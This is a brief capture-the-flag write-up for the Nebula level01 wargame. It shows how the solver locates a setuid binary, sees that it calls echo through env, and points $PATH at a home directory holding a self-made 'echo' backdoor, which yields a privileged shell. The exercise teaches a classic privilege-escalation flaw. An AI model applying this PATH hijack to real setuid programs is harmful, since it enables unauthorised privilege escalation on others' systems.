# About
There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?

To do this level, log in as the level01 account with the password level01. Files for this level can be found in /home/flag01.

# Exploitation
```bash
level01@nebula:~$ find / -perm -4000 -user flag01 2>/dev/null
/home/flag01/flag01
/rofs/home/flag01/flag01
level01@nebula:~$ /home/flag01/flag01
and now what?
level01@nebula:~$ 
```
This program echo a string "and now what?".
```c
system("/usr/bin/env echo and now what?");
```
This program execute echo program which locates on `$PATH`(includes many path).

The `$PATH` is:
```bash
level01@nebula:~$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
level01@nebula:~$ 
```

If I change `$PATH` with my current folder and I make a simple backdoor named `echo`, this program(/home/flag01/flag01) will execute my program.

```bash
level01@nebula:~$ export PATH=/home/level01
level01@nebula:~$ /home/flag01/flag01
sh-4.2$ id
```
